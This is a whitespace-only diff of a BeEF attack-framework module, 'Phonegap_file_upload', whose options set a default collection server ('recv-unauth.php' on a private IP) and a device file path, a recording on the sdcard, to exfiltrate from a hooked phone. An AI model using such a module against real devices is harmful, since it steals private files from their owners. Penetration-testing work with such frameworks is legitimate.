@@ -7,18 +7,18 @@
 #
 
 class Phonegap_file_upload < BeEF::Core::Command
-  
+
     def self.options
         return [{
-            'name' => 'file_upload_dst', 
-            'description' => 'Upload a file from device to your server', 
-            'ui_label'=>'Destination', 
+            'name' => 'file_upload_dst',
+            'description' => 'Upload a file from device to your server',
+            'ui_label'=>'Destination',
             'value' => 'http://192.168.9.130/recv-unauth.php',
             'width' => '300px'
             },{
-            'name' => 'file_upload_src',    
-            'description' => 'path to file on device', 
-            'ui_label'=>'File Path', 
+            'name' => 'file_upload_src',
+            'description' => 'path to file on device',
+            'ui_label'=>'File Path',
             'value' => '/sdcard/myrecording.wav',
             'width' => '300px'
             }]
@@ -29,5 +29,5 @@ class Phonegap_file_upload < BeEF::Core::Command
     content['Result'] = @datastore['result']
     save content
 
-  end 
+  end
 end
